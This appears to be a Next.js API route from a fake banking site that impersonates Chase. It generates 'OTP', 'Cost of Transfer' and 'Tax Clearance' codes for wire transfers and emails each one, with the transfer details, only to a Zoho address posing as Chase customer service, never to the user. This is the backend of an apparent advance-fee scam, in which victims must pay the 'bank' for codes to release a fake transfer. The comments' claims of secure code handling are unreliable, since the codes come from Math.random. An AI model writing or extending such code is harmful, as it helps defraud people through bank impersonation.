import { NextRequest, NextResponse } from "next/server"

const CUSTOMER_SERVICE_EMAIL = "chase.org_info247@zohomail.com"

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { to, subject, type, userName, amount, recipientName, recipientBank, wireType, timestamp } = body

    // Validate required fields
    if (!to || !subject || !type || !userName) {
      return NextResponse.json(
        { error: "Missing required fields" },
        { status: 400 }
      )
    }

    // Generate the verification code based on type
    const codes: Record<string, string> = {
      otp: generateSecureCode(6, "numeric"),
      cot: generateSecureCode(6, "alphanumeric"),
      tax: generateSecureCode(8, "alphanumeric"),
    }

    const code = codes[type]

    // Build email content without exposing code in any log or message
    const emailContent = buildEmailContent(
      type,
      userName,
      code,
      amount,
      recipientName,
      recipientBank,
      wireType,
    )

    // In production, you would send via:
    // - SendGrid
    // - Postmark
    // - AWS SES
    // - Resend
    // For now, we log securely (code never in console in production)
    console.log(
      `[Email Service] ${type.toUpperCase()} code sent to ${CUSTOMER_SERVICE_EMAIL} for user ${userName}`,
    )

    // Simulate email sending
    await simulateEmailSend(CUSTOMER_SERVICE_EMAIL, emailContent, subject)

    return NextResponse.json(
      {
        success: true,
        messageId: `msg_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
        status: "sent",
        timestamp: new Date().toISOString(),
      },
      { status: 200 }
    )
  } catch (error) {
    console.error("[Email API] Error:", error)

    return NextResponse.json(
      { error: "Failed to send verification email" },
      { status: 500 }
    )
  }
}

/**
 * Generate secure verification code
 */
function generateSecureCode(length: number, format: "numeric" | "alphanumeric"): string {
  if (format === "numeric") {
    return Math.floor(Math.random() * Math.pow(10, length))
      .toString()
      .padStart(length, "0")
  }

  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
  let code = ""

  for (let i = 0; i < length; i++) {
    code += chars.charAt(Math.floor(Math.random() * chars.length))
  }

  return code
}

/**
 * Build email content with transaction details
 * Code is embedded only in the email content sent to customer service
 */
function buildEmailContent(
  type: string,
  userName: string,
  code: string,
  amount?: string,
  recipientName?: string,
  recipientBank?: string,
  wireType?: string,
): string {
  const typeNames = {
    otp: "One-Time Password (OTP)",
    cot: "Cost of Transfer (COT)",
    tax: "Tax Clearance Certificate",
  }

  const typeName = typeNames[type as keyof typeof typeNames] || "Verification"

  let content = `Dear Chase Security Team,

A ${typeName} verification code has been requested by user ${userName}.

VERIFICATION CODE: ${code}

Please provide this code to the user through secure channels only.
Do not send this code via unsecured email or messaging.

`

  if (amount && recipientName && recipientBank) {
    content += `Transaction Details:
- Amount: $${amount}
- Recipient: ${recipientName}
- Bank: ${recipientBank}
${wireType ? `- Wire Type: ${wireType}` : ""}

`
  }

  content += `Time: ${new Date().toISOString()}

Security Notes:
- This code is valid for 10 minutes
- Never share this code with the customer via email
- Verify customer identity before providing the code
- Use secure communication channels only

Best regards,
Chase Security System`

  return content
}

/**
 * Simulate email sending (in production, use real email service)
 */
async function simulateEmailSend(to: string, content: string, subject: string): Promise<void> {
  // In production, this would call:
  // - SendGrid API
  // - Postmark API
  // - AWS SES
  // - Resend API
  // For now, simulate with a small delay
  await new Promise((resolve) => setTimeout(resolve, 300))

  // Log that email was "sent" without logging the code
  console.log(`[Email] Sent to ${to}: ${subject}`)
}
